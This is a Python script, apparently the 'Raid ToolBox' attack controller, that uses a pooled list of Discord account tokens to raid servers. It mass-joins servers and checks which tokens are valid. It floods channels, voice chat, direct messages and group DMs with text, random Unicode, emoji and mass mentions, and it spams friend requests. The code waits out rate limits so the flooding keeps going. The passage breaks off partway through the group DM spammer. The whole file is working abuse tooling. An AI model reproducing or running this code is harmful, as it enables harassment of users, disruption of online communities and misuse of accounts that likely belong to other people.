#!/usr/bin/env python3
# Raid ToolBox Attack Controller
# Author: DeadBread76 - https://github.com/DeadBread76/
# July 3rd, 2019
#
# Copyright (c) 2019, DeadBread
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
# SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
# OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
# CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import os, sys, ast, json, time, random, base64, subprocess, requests, shutil
from itertools import cycle
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
mode = sys.argv[1]
pycommand = sys.argv[2]
climode = int(sys.argv[3])
threadcount = sys.argv[4]
theme = ast.literal_eval(sys.argv[5])
if not climode == 1:
    if not sys.platform.startswith('darwin'):
        import PySimpleGUI as sg
    else:
        import PySimpleGUIQt as sg
    if theme['use_custom_theme']:
        sg.SetOptions(background_color=theme['background_color'],
                     text_element_background_color=theme['text_element_background_color'],
                     element_background_color=theme['element_background_color'],
                     scrollbar_color=theme['scrollbar_color'],
                     input_elements_background_color=theme['input_elements_background_color'],
                     input_text_color=theme['input_text_color'],
                     button_color=theme['button_colour'],
                     text_color=theme['text_color'])
    else:
        sg.ChangeLookAndFeel(theme['preset_theme'])
executor = ThreadPoolExecutor(max_workers=int(threadcount))
tokenlist = open("tokens.txt").read().splitlines()
true = 'true'
false = 'false'

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

if mode == 'joiner':
    successfully = []
    def join(token,link,widget):
        global successfully
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if widget:
            src = requests.get("https://canary.discordapp.com/api/guilds/{}/widget.json".format(str(link)))
            widgson = json.loads(src.content)
            try:
                link = widgson['instant_invite'][37:]
            except Exception:
                sys.exit()
            src = requests.post("https://canary.discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
            if src.status_code == 401:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            successfully.append(token)
        else:
            src = requests.post("https://canary.discordapp.com/api/v6/invite/{}".format(str(link)), headers=headers)
            if src.status_code == 401:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            successfully.append(token)
    if climode == 0:
        layout = [
                [sg.Text('Enter Invite to join.'), sg.InputText(size=(40,1)),sg.RButton('Join',button_color=theme['button_colour'],size=(10,1))],
                [sg.Text('Delay'), sg.Combo(['0','1','3','5','10','60']), sg.Checkbox('Log Info', tooltip='Log Info of server to text file.',size=(8,1)), sg.Checkbox('Widget joiner (Requires Server ID)'), sg.Text('Limit:', size=(4,1)),sg.Input(len(tokenlist),size=(3,1),tooltip="Number of tokens to join.")],
                ]
        window = sg.Window('RTB | Joiner', layout, keep_on_top=True)
        event, values = window.Read()
        print(values)
        window.Close()
        link = values[0]
        delay = values[1]
        log = values[2]
        widget = values[3]
        limit = int(values[4])
        if event == "Join":
            pass
        else:
            sys.exit()
    else:
        link = sys.argv[6]
        log = False
        widget = False
        delay = "0"
        limit = len(tokenlist)
    if widget:
        pass
    else:
        if 'https://discordapp.com/invite/' in link:
            link = link[30:]
        elif len(link) > 7:
            link = link[19:]
    count = 0
    if not delay == '0':
        for token in tokenlist:
            executor.submit(join,token,link,widget)
            count += 1
            if count == limit:
                break
            time.sleep(int(delay))
    else:
        for token in tokenlist:
            executor.submit(join,token,link,widget)
            count += 1
            if count == limit:
                break
    if log:
        executor.shutdown(wait=True)
        try:
            s = requests.get("https://canary.discordapp.com/api/v6/invite/{}".format(link)).text
            serjson = json.loads(s)
            with open("JoinerLogs.txt", "a+", errors='ignore') as handle:
                handle.write("=======================\n{}\n=======================\nInvite Code: {}\nServer name: {}\nServer ID: {}\nInvite channel ID: {}\nInvite Channel Name: {}\nVerification Level: {}\n\n".format(str(datetime.now()),serjson['code'],serjson['guild']['name'],serjson['guild']['id'],serjson['channel']['id'],serjson['channel']['name'],serjson['guild']['verification_level']))
            layout = [[sg.Text('Server Name: {}'.format(serjson['guild']['name']))],
                    [sg.Text('Server ID: {}'.format(serjson['guild']['id']))],
                    [sg.Text('Tokens Joined Successfully: {}'.format(len(successfully)))],
                    [sg.Button('kthxbye',button_color=theme['button_colour'],size=(15,1)), sg.Button('Export Tokens',button_color=theme['button_colour'],size=(15,1))]
                    ]
            window = sg.Window('RTB | Joiner Results', layout, keep_on_top=True)
            event, values = window.Read()
            window.Close()
            if event == "Export Tokens":
                with open ("working_tokens_exported.txt","a+") as handle:
                    for token in successfully:
                        handle.write("{}\n".format(token))
                sg.PopupOK('Exported {} tokens to working_tokens_exported.txt'.format(len(successfully)),title="RTB")
        except Exception:
            pass

elif mode == 'leaver':
    def leave(token,ID):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://canary.discordapp.com/api/v6/users/@me/guilds/{}".format(str(ID)), headers=headers)
    if climode == 0:
        layout = [[sg.Text('Enter server ID to leave.'), sg.InputText(size=(30,1)),sg.RButton('Leave',button_color=theme['button_colour'],size=(10,1))]]
        window = sg.Window('RTB | Leaver', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        ID = values[0]
        if event == "Leave":
            pass
        else:
            sys.exit()
    else:
        ID = sys.argv[6]
    for token in tokenlist:
        executor.submit(leave,token,ID)

elif mode == 'groupleaver':
    def grleave(token,ID):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        requests.delete("https://canary.discordapp.com/api/v6/channels/{}".format(str(ID)), headers=headers)
    if climode == 0:
        layout = [[sg.Text('Enter Group ID to leave.'), sg.InputText(size=(30,1)),sg.RButton('Leave',button_color=theme['button_colour'],size=(10,1))]]
        window = sg.Window('RTB | Group DM Leaver', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        ID = values[0]
        if event == "Leave":
            pass
        else:
            sys.exit()
    else:
        ID = sys.argv[6]
    for token in tokenlist:
        executor.submit(grleave,token,ID)

elif mode == "Checker":
    verifiedtokens = []
    unverifiedtokens = []
    invalidtokens = []
    if len(tokenlist) > 100:
        choice = sg.PopupYesNo("You Have Over 100 tokens. I'd Recommend using Checker V2 for this many\nas you could get CloudFlare banned.\nContinue?")
        if choice == "Yes":
            pass
        else:
            sys.exit()
    sg.PopupTimed("Checking Tokens...", title="DeadBread's Raid Toolbox | Checker", non_blocking=True)
    def check(token):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        src = requests.post('https://canary.discordapp.com/api/v6/invite/{}'.format(random.randint(1,9999999)), headers=headers)
        if "You need to verify your account in order to perform this action." in str(src.content):
            unverifiedtokens.append(token)
        elif "401: Unauthorized" in str(src.content):
            invalidtokens.append(token)
        else:
            if token in verifiedtokens:
                pass
            else:
                verifiedtokens.append(token)
    for token in tokenlist:
        executor.submit(check, token)
    executor.shutdown(wait=True)
    vlist = ''
    ulist = ''
    ilist = ''
    for token in verifiedtokens:
        vlist += token + "\n"
    for token in unverifiedtokens:
        ulist += token + "\n"
    for token in invalidtokens:
        ilist += token + "\n"
    layout = [
             [sg.Text('Verified Tokens ({}):'.format(len(verifiedtokens)),size=(59,1)), sg.Text('Unverified Tokens ({}):'.format(len(unverifiedtokens)))],
             [sg.Multiline(vlist, size=(66,20)), sg.Multiline(ilist, size=(66,20))],
             [sg.RButton('Save Verified',button_color=theme['button_colour'],size=(10,1)), sg.RButton('Save Both',button_color=theme['button_colour'],size=(10,1))]
             ]
    window = sg.Window('RTB | Checker | [{} Verified] [{} Unverified] [{} Invalid]'.format(len(verifiedtokens),len(unverifiedtokens),len(invalidtokens)), layout, keep_on_top=True)
    event, values = window.Read()
    if event == "Save Verified":
        if os.path.isdir("tokenbin"):
            pass
        else:
            os.mkdir("tokenbin")
        shutil.copyfile("tokens.txt", "tokenbin/oldtokens{}.txt".format(random.randint(1,999)))
        time.sleep(0.1)
        with open ("tokens.txt","w+") as handle:
            handle.write(vlist)
            sg.PopupOK('Saved', title="RTB | Saved tokens")
    elif event == "Save Both":
        if os.path.isdir("tokenbin"):
            pass
        else:
            os.mkdir("tokenbin")
        shutil.copyfile("tokens.txt", "tokenbin/oldtokens{}.txt".format(random.randint(1,999)))
        time.sleep(0.1)
        with open ("tokens.txt","w+") as handle:
            handle.write(vlist)
            handle.write(ulist)
            sg.PopupOK('Saved', title="RTB | Saved tokens")
    window.Close()

elif mode == "Checker V2":
    verifiedtokens = []
    unverifiedtokens = []
    invalidtokens = []
    sg.PopupTimed("Checking Tokens...", title="DeadBread's Raid Toolbox | Checker V2", non_blocking=True)
    def checkv2(token):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        if "401: Unauthorized" in str(src.content):
            invalidtokens.append(token)
        else:
            response = json.loads(src.content.decode())
            if response["verified"]:
                verifiedtokens.append(token)
            else:
                unverifiedtokens.append(token)
    for token in tokenlist:
        executor.submit(checkv2, token)
    executor.shutdown(wait=True)
    vlist = ''
    ulist = ''
    ilist = ''
    for token in verifiedtokens:
        vlist += token + "\n"
    for token in unverifiedtokens:
        ulist += token + "\n"
    for token in invalidtokens:
        ilist += token + "\n"
    layout = [
             [sg.Text('Verified Tokens ({}):'.format(len(verifiedtokens)),size=(59,1)), sg.Text('Unverified Tokens ({}):'.format(len(unverifiedtokens)))],
             [sg.Multiline(vlist, size=(66,20)), sg.Multiline(ilist, size=(66,20))],
             [sg.RButton('Save Verified',button_color=theme['button_colour'],size=(10,1)), sg.RButton('Save Both',button_color=theme['button_colour'],size=(10,1))]
             ]
    window = sg.Window('RTB | Checker V2 | [{} Verified] [{} Unverified] [{} Invalid]'.format(len(verifiedtokens),len(unverifiedtokens),len(invalidtokens)), layout, keep_on_top=True)
    event, values = window.Read()
    if event == "Save Verified":
        if os.path.isdir("tokenbin"):
            pass
        else:
            os.mkdir("tokenbin")
        shutil.copyfile("tokens.txt", "tokenbin/oldtokens{}.txt".format(random.randint(1,999)))
        time.sleep(0.1)
        with open ("tokens.txt","w+") as handle:
            handle.write(vlist)
            sg.PopupOK('Saved', title="RTB | Saved tokens")
    elif event == "Save Both":
        if os.path.isdir("tokenbin"):
            pass
        else:
            os.mkdir("tokenbin")
        shutil.copyfile("tokens.txt", "tokenbin/oldtokens{}.txt".format(random.randint(1,999)))
        time.sleep(0.1)
        with open ("tokens.txt","w+") as handle:
            handle.write(vlist)
            handle.write(ulist)
            sg.PopupOK('Saved', title="RTB | Saved tokens")
    window.Close()


elif mode == 'messagespam':
    def sendmessage(token,text,channel,server,emojispam):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if emojispam:
            text += " "
            src = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/emojis".format(server), headers=headers)
            for emoji in json.loads(src.content):
                if emoji['animated'] == True:
                    pass
                else:
                    text += "<:{}:{}>".format(emoji['name'],emoji['id'])
            if channel == 'all':
                payload = {"content": text, "tts": false}
                chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
                channellist = json.loads(chanjson)
                while True:
                    for channel in channellist:
                        if not channel['type'] == 0:
                            continue
                        else:
                            for m in [text[i:i+1999] for i in range(0, len(text), 1999)]:
                                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                                if src.status_code == 429:
                                    ratelimit = json.loads(src.content)
                                    time.sleep(float(ratelimit['retry_after']/1000))
                                elif src.status_code == 401:
                                    error = json.loads(src.content)
                                    with open('errors.log', 'a') as errorlogging:
                                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                    sys.exit()
                                elif src.status_code == 404:
                                    error = json.loads(src.content)
                                    with open('errors.log', 'a') as errorlogging:
                                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                    sys.exit()

            else:
                headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
                payload = {"content": text, "tts": false}
                while True:
                    for m in [text[i:i+1999] for i in range(0, len(text), 1999)]:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
        else:
            if channel == 'all':
                payload = {"content": text, "tts": false}
                chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
                channellist = json.loads(chanjson)
                while True:
                    for channel in channellist:
                        if not channel['type'] == 0:
                            continue
                        else:
                            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                time.sleep(float(ratelimit['retry_after']/1000))
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()

            else:
                headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
                payload = {"content": text, "tts": false}
                while True:
                    src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                    if src.status_code == 429:
                        ratelimit = json.loads(src.content)
                        time.sleep(float(ratelimit['retry_after']/1000))
                    elif src.status_code == 401:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
                    elif src.status_code == 404:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
    if climode == 0:
        layout = [
              [sg.Text('Text To Spam', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1)),sg.Checkbox("Append Emoji Spam",tooltip="Add Emoji Spam to message, message can be empty.")]
             ]
        window = sg.Window('RTB | Message Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        text = values[0]
        channelid = values[1]
        SERVER = values[2]
        emojispam = values[3]
    else:
        text = sys.argv[6]
        channelid = sys.argv[7]
        SERVER = sys.argv[8]
        emojispam = False
    for token in tokenlist:
        executor.submit(sendmessage,token,text,channelid,SERVER,emojispam)

elif mode == 'asciispam':
    def sendascii(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": asciigen(1999), "tts": false}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
        else:
            while True:
                payload = {"content": asciigen(1999), "tts": false}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    time.sleep(float(ratelimit['retry_after']/1000))
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
    if climode == 0:
        layout = [[sg.Text('WARNING: This will make your Discord client lag by just looking at the channel,\nI recommend not looking at the channels while doing this attack.')],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
             ]
        window = sg.Window('RTB | Ascii Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channelid = values[0]
        SERVER = values[1]
    else:
        channelid = sys.argv[6]
        SERVER = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendascii,token,channelid,SERVER)

elif mode == 'massmention':
    def sendmention(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        memberlist = []
        msg = ''
        memb = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/members?limit=1000".format(server),headers=headers).text
        memberjson = json.loads(memb)
        for member in memberjson:
            memberlist.append("<@{}>".format(member['user']['id']))
        for member in memberlist:
            msg += member + ' '
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json={"content" : m,"tts" : false})
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                time.sleep(float(ratelimit['retry_after']/1000))
                                requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json={"content" : m,"tts" : false})
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            while True:
                for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                    src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json={"content": m, "tts": false})
                    if src.status_code == 429:
                        ratelimit = json.loads(src.content)
                        time.sleep(float(ratelimit['retry_after']/1000))
                    elif src.status_code == 401:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
                    elif src.status_code == 404:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
    if climode == 0:
        layout = [
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
              ]
        window = sg.Window('RTB | Mass Mentioner', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        SERVER = values[0]
        channelid = values[1]
    else:
        SERVER = sys.argv[6]
        channelid = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendmention,token,channelid,SERVER)

elif mode == 'vcspam':
    import youtube_dl
    ydl_opts = {
        'outtmpl': 'RTBFiles/vcspammercache/file.webm',
        'format': 'bestaudio/best',
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'wav',
            'preferredquality': '192',
        }],
    }
    if climode == 0:
        layout = [
              [sg.Text('YouTube Link to play', size=(15, 1)), sg.InputText()],
              [sg.Text('Voice Channel ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Ammount of Tokens', size=(15, 1)), sg.Slider(range=(1,len(tokenlist)),
              default_value=len(tokenlist),
              size=(29,15),
              orientation='horizontal',
              font=('Helvetica', 10),text_color=(theme['slider_text_color']))],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
              ]
        window = sg.Window('RTB | Voice Chat Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        ytlink = values[0]
        channelid = values[1]
        ammount = values[2]
    else:
        ytlink = sys.argv[6]
        channelid = sys.argv[7]
        ammount = sys.argv[8]
    if not os.path.isdir('RTBFiles/vcspammercache/'):
        os.mkdir("RTBFiles/vcspammercache/")
    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        info_dict = ydl.extract_info(ytlink, download=False)
        video_id = info_dict.get("id", None)
    if not os.path.isfile('RTBFiles/vcspammercache/{}.wav'.format(video_id)):
        ydl_opts = {
         'outtmpl': 'RTBFiles/vcspammercache/{}.webm'.format(video_id),
         'format': 'bestaudio/best',
         'postprocessors': [{
             'key': 'FFmpegExtractAudio',
             'preferredcodec': 'wav',
             'preferredquality': '192',
         }],
        }
        with youtube_dl.YoutubeDL(ydl_opts) as ydl:
            ydl.download([ytlink])
    count = 0
    for token in tokenlist:
        count += 1
        subprocess.Popen([pycommand,'RTBFiles/vcspam.py',token,channelid,'RTBFiles/vcspammercache/{}.wav'.format(video_id),str(os.getpid())],stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
        if count == int(ammount):
            break
    while True:
        pass

elif mode == 'dmspammer':
    def dmspammer(token,userid,text,ascii):
        list = []
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {
            'recipient_id': userid
        }
        src = requests.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
        userdm = src.content.decode()
        jsonstring = json.loads(userdm).values()
        for x in jsonstring:
            list.append(x)
        userdm = list[2]
        if ascii == True:
            payload = {"content": asciigen(1999), "tts": false}
        else:
            payload = {"content": text, "tts": false}
        while True:
            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(userdm), headers=headers, json=payload)
            if src.status_code == 429:
                ratelimit = json.loads(src.content)
                time.sleep(float(ratelimit['retry_after']/1000))
            elif src.status_code == 401:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
    if climode == 0:
        layout = [
            [sg.Text('Note: The tokens need to share a mutual server with the target for this to work.')],
            [sg.Text('Users ID', size=(15, 1)), sg.InputText()],
            [sg.Text('Text to spam', size=(15, 1)), sg.InputText(), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.')],
            [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
            ]
        window = sg.Window('RTB | DM Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        userid = values[0]
        text = values[1]
        ascii = values[2]
    else:
        userid = sys.argv[6]
        text = sys.argv[7]
        if text == "ascii":
            ascii = True
        else:
            ascii = False
    for token in tokenlist:
        executor.submit(dmspammer,token,userid,text,ascii)

elif mode == 'friender':
    def friend(token,userid):
        if "#" in userid:
            headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            user = userid.split("#")
            payload = {"username": user[0], "discriminator": user[1]}
            requests.post('https://canary.discordapp.com/api/v6/users/@me/relationships', headers=headers,json=payload)
        else:
            headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            requests.put('https://canary.discordapp.com/api/v6/users/@me/relationships/{}'.format(str(userid)), headers=headers)
    if climode == 0:
        layout = [
              [sg.Text('Enter A User ID or Name + Tag')],
              [sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
             ]
        window = sg.Window('RTB | Group DM Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        userid = values[0]
    else:
        userid = sys.argv[6]
    for token in tokenlist:
        executor.submit(friend,token,userid)

elif mode == 'groupdmspam':
    def sendgdm(token,text,group,ascii):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        payload = {"content": text, "tts": false}
        while True:
            if ascii:
                payload = {"content": asciigen(1999), "tts": false}
            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(group), headers=headers, json=payload)
            if src.status_code == 429:
                ratelimit = json.loads(src.content)
                time.sleep(float(ratelimit['retry_after']/1000))
            elif src.status_code == 401:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
            elif src.status_code == 404:
                error = json.loads(src.content)
                with open('errors.log', 'a') as errorlogging:
